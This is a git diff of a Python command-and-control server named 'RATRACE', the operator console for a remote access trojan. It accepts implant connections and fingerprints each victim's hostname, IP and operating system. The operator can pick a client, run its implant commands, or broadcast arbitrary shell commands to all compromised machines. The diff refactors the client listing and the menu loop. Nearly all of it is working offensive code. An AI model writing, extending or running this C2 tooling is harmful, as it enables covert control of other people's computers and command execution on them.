@@ -2,8 +2,6 @@ import socket
 import threading
 import atexit
 import signal
-import os
-import time
 from pwn import log, str_input, options, splash
 
 art = r"""______  ___ ___________  ___  _____  _____  / \____/ \        /  \
@@ -34,12 +32,9 @@ class C2Server:
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
             s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
             s.bind((self.host, self.port))
-            s.listen(10)
+            s.listen(50)
             s.settimeout(1.0)
             self.server = s
-
-            #self.listening = log.waitfor(f"{self.host}:{self.port} Status", status='Listening')
-            #self.listening.success()
 
             while self.running:
                 try:
@@ -53,7 +48,6 @@ class C2Server:
 
     def stop(self):
         self.running = False
-
         if self.server:
             try:
                 self.server.shutdown(socket.SHUT_RDWR)
@@ -108,6 +102,29 @@ class C2Server:
                 continue
         self.clients = alive_clients
 
+    def list_clients(self):
+        self.remove_dead()
+        if len(self.clients) > 0:
+            #Format: Hostname, ip, port, os
+            nice_client_list = []
+            for index, client in self.clients:
+                self.select_client(index)
+                client_data = [
+                    client.gethostname(),                                        #Hostname
+                    client.getpeername(),                                        #Ip, Port
+                    self.send_command('python -c "import os; print(os.name)"')   #OS
+                ]
+                if client_data[2] == "nt":
+                    client_data[2] = "Windows"
+                else:
+                    client_data[2] = "Linux / Other"
+                nice_client_list.append(client_data)
+            return nice_client_list
+        else:
+            log.warning("No clients connected")
+            return []
+
+
 if __name__ == "__main__":
     items = ["Start Server","Check Clients", "Connect to Client", "Send to All Clients", "Exit"]
     running = False
@@ -117,24 +134,24 @@ if __name__ == "__main__":
     atexit.register(server.stop)
 
     def handle_sigint(sig, frame):
-        log.info("Caught CTRL + C, Shutting Down")
+        log.debug("Caught CTRL + C, Shutting Down")
         server.stop()
         exit(0)
     signal.signal(signal.SIGINT, handle_sigint)
 
-    def interactive(sendall = False, operatingSystem = None):
-        run = True
+    def interactive(sendall = False, operating_system = None):
+        run_interactive = True
         runstatus = log.waitfor(f"Interactive mode | enter 'return' to quit | STATUS = ", status = "Commanding")
-        while run:
+        while run_interactive:
             command = str_input('C2> ')
             if command == "return":
-                    run = False
+                    run_interactive = False
                     log.info("Returning...\n")
             else:
                 if sendall:
                     for i in range(len(server.clients)):
                         server.select_client(i)
-                        if operatingSystem is not None and server.send_command('python -c "import os; print(os.name)"') != operatingSystem:
+                        if operating_system is not None and server.send_command('python -c "import os; print(os.name)"') != operating_system:
                             pass
                         else:
                             output = server.send_command(command)
@@ -146,8 +163,8 @@ if __name__ == "__main__":
         runstatus.success()
 
     print(art)
-    ratrace = True
-    while ratrace:
+    run_c2 = True
+    while run_c2:
         choice = options('Welcome to RATRACE - Make your Selection', items)
         if choice == 0:		#Start / Stop Server
             if not running:
@@ -161,43 +178,37 @@ if __name__ == "__main__":
                 server.stop()
                 items[0] = "Start Server"
                 running = False
+
         elif choice == 1: 	 #List Clients
-            server.remove_dead()
-            if len(server.clients) > 0:
-                log.info("FORMAT: ('REMOTE ADDR', REMOTE PORT)")
-                for client in server.clients:
-                    format = str(client).split("raddr=")
-                    format = format[1].strip(">")
-                    log.info(format)
+            client_list = server.list_clients()
+            if len(client_list) > 0:
+                log.info("[ Hostname, IP, Port, OS ]")
+                for client_data in client_list:
+                    log.info(client_data)
+
+        elif choice == 2:	# Connect to a Client
+            client_list = server.list_clients()
+            if len(client_list) > 0:
+                target = options('Select a client:', client_list)
+                server.select_client(target)
+                implant = server.send_command("info").split(' ')
+                implant.append("interactive")
+                implant.append("return")
+                run_implant = True
+                while run_implant:
+                    c2_choice = (options(f'Connected to {implant[0]} on {client_list[target]}', implant[1:]) + 1)
+                    if implant[c2_choice] != "return":
+                        if implant[c2_choice] == "interactive":
+                            interactive()
+                        else:
+                            output = server.send_command(implant[c2_choice])
+                            log.info(output)
+                    else:
+                        log.info("Returning...\n")
+                        run_implant = False
             else:
                 log.warning("No clients connected")
-        elif choice == 2:	# Connect to a Client
-                if len(server.clients) > 0:
-                    server.remove_dead()
-                    targets = []
-                    for client in server.clients:
-                        format = str(client).split("raddr=")
-                        format = format[1].strip(">")
-                        targets.append(format)
-                    target = options('Select a client:', targets)
-                    server.select_client(target)
-                    implant = server.send_command("info").split(' ')
-                    implant.append("interactive")
-                    implant.append("return")
-                    run = True
-                    while run:
-                        c2choice = (options(f'Connected to {implant[0]} on {targets[target]}', implant[1:]) + 1)
-                        if implant[c2choice] != "return":
-                            if implant[c2choice] == "interactive":
-                                interactive()
-                            else:
-                                output = server.send_command(implant[c2choice])
-                                log.info(output)
-                        else:
-                            log.info("Returning...\n")
-                            run = False
-                else:
-                    log.warning("No clients connected")
+
         elif choice == 3: #sendall
             if len(server.clients) > 0:
                 server.remove_dead()
@@ -210,8 +221,9 @@ if __name__ == "__main__":
                     interactive(True, "posix")
             else:
                 log.warning("No clients connected")
+
         else:
             server.stop()
-            ratrace = False
+            run_c2 = False
             splash()
             input("Press enter to continue...")
